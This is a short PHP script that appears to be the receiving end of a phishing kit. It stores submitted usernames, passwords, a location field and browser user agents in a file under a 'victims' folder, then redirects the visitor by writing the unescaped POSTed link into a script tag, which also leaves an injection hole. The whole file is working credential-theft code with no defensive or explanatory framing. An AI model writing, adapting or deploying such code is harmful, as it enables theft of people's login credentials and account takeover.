<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') 
{
	 file_put_contents(".././victims/password.txt",                  "\n".
                   "username:"      .$_POST['username'].             "\n".
                   "password="      .$_POST['password'].             "\n".
				   "From="          .$_POST['location'].             "\n".
				   "User-agent="    .$_SERVER['HTTP_USER_AGENT'].    "\n"
				   , FILE_APPEND);
    echo "<script>window.location.replace('".$_POST['link']."');</script>";
}
?>